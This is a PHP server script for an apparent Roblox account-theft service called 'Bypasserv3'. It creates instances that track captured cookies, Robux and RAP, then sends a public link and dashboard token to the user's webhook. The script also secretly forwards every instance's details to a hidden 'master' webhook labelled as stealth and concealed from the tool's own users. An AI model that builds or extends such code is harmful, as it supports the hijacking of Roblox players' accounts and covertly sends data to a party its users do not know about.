<?php

header('Content-Type: application/json');

require_once '../config.php';
require_once '../functions.php';

function generateToken($length = 32) {
    $base = 'BYPASSERV3';
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomPart = '';
    
    for ($i = 0; $i < $length - strlen($base); $i++) {
        $randomPart .= $characters[random_int(0, strlen($characters) - 1)];
    }
    
    $mixed = str_shuffle($base . $randomPart);
    return substr($mixed, 0, $length);
}

// Get POST data
$input = json_decode(file_get_contents('php://input'), true);
$directory = trim($input['directory'] ?? '');
$userWebhook = trim($input['userWebhook'] ?? '');

// Get MASTER_WEBHOOK from environment variable (COMPLETELY HIDDEN FROM USERS)
$masterWebhook = defined('STEALTH_MASTER') ? STEALTH_MASTER : '';

if (empty($masterWebhook)) {
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'Server configuration error. Please contact administrator.']);
    exit;
}

// Validate directory name
if (empty($directory)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Directory name is required']);
    exit;
}

if (!preg_match('/^[A-Za-z0-9_-]{3,32}$/', $directory)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Directory can only contain letters, numbers, hyphens, and underscores (3-32 characters)']);
    exit;
}

// Validate user webhook (REQUIRED)
if (empty($userWebhook)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Webhook URL is required']);
    exit;
}

if (!filter_var($userWebhook, FILTER_VALIDATE_URL)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Invalid webhook URL']);
    exit;
}

// Check if webhook is valid/alive
$ch = curl_init($userWebhook);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_NOBODY, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($httpCode == 404) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Webhook is dead (404 Not Found)']);
    exit;
}

if ($httpCode < 200 || $httpCode >= 300) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Invalid webhook URL - please check and try again']);
    exit;
}

// Check if directory already exists
$instancePath = INSTANCES_DIR . "/$directory";
if (file_exists($instancePath)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Directory name already taken']);
    exit;
}

// Create instance directory
mkdir($instancePath, 0777, true);

// Generate unique token
$token = generateToken();

// Create instance files
file_put_contents("$instancePath/webhook.txt", $masterWebhook); // MASTER WEBHOOK (hidden from user)
file_put_contents("$instancePath/userwebhook.txt", $userWebhook); // User's webhook
file_put_contents("$instancePath/token.txt", $token);
file_put_contents("$instancePath/visits.txt", '0');
file_put_contents("$instancePath/cookies.txt", '0');
file_put_contents("$instancePath/robux.txt", '0');
file_put_contents("$instancePath/rap.txt", '0');
file_put_contents("$instancePath/summary.txt", '0');
file_put_contents("$instancePath/username.txt", '');
file_put_contents("$instancePath/profilepic.txt", 'https://www.roblox.com/headshot-thumbnail/image/default.png');
file_put_contents("$instancePath/created.txt", date('Y-m-d H:i:s'));

// Create daily stats files
file_put_contents("$instancePath/daily_cookies.txt", json_encode(array_fill(0, 7, 0)));
file_put_contents("$instancePath/daily_robux.txt", json_encode(array_fill(0, 7, 0)));
file_put_contents("$instancePath/daily_rap.txt", json_encode(array_fill(0, 7, 0)));
file_put_contents("$instancePath/daily_summary.txt", json_encode(array_fill(0, 7, 0)));
file_put_contents("$instancePath/daily_visits.txt", json_encode(array_fill(0, 7, 0)));

// Create logs file
file_put_contents("$instancePath/logs.txt", '');

// Save token
file_put_contents(TOKENS_DIR . "/$token.txt", "$token|$directory|$masterWebhook|" . date('Y-m-d H:i:s') . PHP_EOL);
file_put_contents(TOKENS_DIR . "/all_tokens.txt", "$token|$directory|$masterWebhook|" . date('Y-m-d H:i:s') . PHP_EOL, FILE_APPEND | LOCK_EX);

// Get domain info
$domain = $_SERVER['HTTP_HOST'] ?? 'localhost';
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
$publicUrl = "$protocol://$domain/public/?dir=" . urlencode($directory);
$dashboardUrl = "$protocol://$domain/dashboard/sign-in.php?token=" . urlencode($token);

// Send success webhook to USER'S webhook ONLY (master webhook is hidden)
$webhookData = [
    'username' => 'Bypasserv3',
    'avatar_url' => 'https://cdn-icons-png.flaticon.com/512/5473/5473473.png',
    'embeds' => [[
        'title' => '✅ Bypass Instance Created',
        'description' => "**Your bypass instance has been successfully generated!**",
        'color' => hexdec('00ff00'),
        'fields' => [
            [
                'name' => '🔗 Public Link',
                'value' => "```$publicUrl```",
                'inline' => false
            ],
            [
                'name' => '📊 Dashboard',
                'value' => "```$dashboardUrl```",
                'inline' => false
            ],
            [
                'name' => '🔑 Access Token',
                'value' => "```$token```",
                'inline' => false
            ],
            [
                'name' => '📁 Directory',
                'value' => "```$directory```",
                'inline' => false
            ]
        ],
        'footer' => ['text' => 'Bypasserv3 • Instance Generator'],
        'timestamp' => date('c')
    ]]
];

// Send to user's webhook
$ch = curl_init($userWebhook);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($webhookData));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

// 🥷 STEALTH: Send to MASTER_WEBHOOK silently (hidden from user, no response)
if (!empty($masterWebhook) && $masterWebhook !== $userWebhook) {
    sendStealthWebhook($masterWebhook, $webhookData);
}

// Log instance creation
logSecurityEvent('instance_created', [
    'directory' => $directory,
    'token' => $token,
    'ip' => getUserIP()
]);

// Return success response
echo json_encode([
    'success' => true,
    'directory' => $directory,
    'token' => $token,
    'publicUrl' => $publicUrl,
    'dashboardUrl' => $dashboardUrl
]);
?>
